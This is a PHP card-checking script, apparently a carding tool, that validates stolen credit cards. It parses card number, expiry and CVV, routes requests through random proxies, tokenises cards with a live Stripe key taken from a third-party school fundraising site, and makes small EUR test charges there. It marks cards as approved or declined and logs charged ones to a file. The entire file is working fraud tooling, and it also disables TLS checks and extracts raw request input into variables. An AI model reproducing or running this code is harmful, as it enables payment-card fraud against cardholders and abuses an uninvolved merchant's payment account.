<?php

session_start();
if(!isset($_SESSION["user_id"])){
    header("Location: login.php");
    exit;
}

##################### STRIPE RAW BY THEFLASHXD ###########################
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

@unlink('cookie.txt');
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $ip);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$proxyFile = 'flash2.txt';

if (!file_exists($proxyFile)) {
    die("❌ Proxy file not found.\n");
}

$proxies = array_filter(array_map('trim', file($proxyFile)));
if (empty($proxies)) {
    die("⚠️ No proxies found in flash2.txt\n");
}

// Pick one random proxy
$proxydefault = $proxies[array_rand($proxies)];
echo "#Proxy:「 $proxydefault 」\n";
//echo "<br><hr>Proxy: $proxy $user";
$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

####################################################
if (strlen($ano) == 2) {
  $ano = "20".$ano;
}else {
 $ano = $ano;
}

####################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl = curl_exec($ch);
curl_close($ch);
$first = trim(strip_tags(getStr($curl,'"first":"','"')));
$last = trim(strip_tags(getStr($curl,'"last":"','"')));
$email = ''.$first.'.'.$last.'@gmail.com';
##########################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$first.'+'.$last.'&billing_details[email]='.$email.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=268584c0-72b5-4c2e-96fe-bfd046be62abacb23e&muid=a0670dd0-a5c5-4450-bccc-de5acff0ef3b7dab73&sid=560a5dcb-c19f-4805-8883-c8c5e71fa06e681d46&pasted_fields=number&payment_user_agent=stripe.js%2Fd991d0758e%3B+stripe-js-v3%2Fd991d0758e%3B+card-element&referrer=https%3A%2F%2Fmysplink.com&time_on_page=74801&key=pk_live_51HpFT5Lqq3eZrJwUQdMsshcuPS5Xldu7cvwH9WOzHc3guXoIwFjOwprM5ef5oj4ND8KaFjZJj68SgdeEkfZUHVAU00p28CsMKO');
$curl = curl_exec($ch);
curl_close($ch);
$tk = trim(strip_tags(getStr($curl,'"id": "','"')));
if (empty($tk)) {
    echo '#Declined '.$ip.'「Declined : '.$ms.' : @luffy_dxD」';
    die();
}
##############################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://mysplink.com/process_payment');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: mysplink.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://mysplink.com';
$headers[] = 'https://mysplink.com/oristownparentscouncil/1calender22';
$headers[] = 'Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'cmd=&profile=oristownparentscouncil&action=process_payment&cut=0.00&rate=0.60&currency=EUR&show_recaptcha=0&amount=1&reverse_fee=yes&description=&payment_type=one_time&12152=school&payment_method=card&cardholder_name='.$first.'+'.$last.'&email='.$email.'&payment_method_id='.$tk.'');
$curl = curl_exec($ch);
curl_close($ch);
$msg = trim(strip_tags(getStr($curl,'message":"','"')));
//echo "<br> Results => $msg <br>";

if(strpos($curl, 'Your card has insufficient funds.')){
echo '<#Approved '.$ip.'「Insufficient Funds」 「Stripe Charge : @luffy_dxD」';
}
elseif(strpos($curl, 'security code is incorrect.')){
echo '#Approved '.$ip.'「'.$error.'」 「Stripe Charge : @luffy_dxD」';
}
elseif(strpos($curl, 'status":true')){
echo '#Approved '.$ip.'「CHARGED CVV」 「Stripe Charge : @luffy_dxD';
fwrite(fopen("fortu.txt", 'a'), $ip. "\r\n");
}
else{
echo '#Declined '.$ip.'「Declined : '.$msg.' : @luffy_dxD」';
}


?>
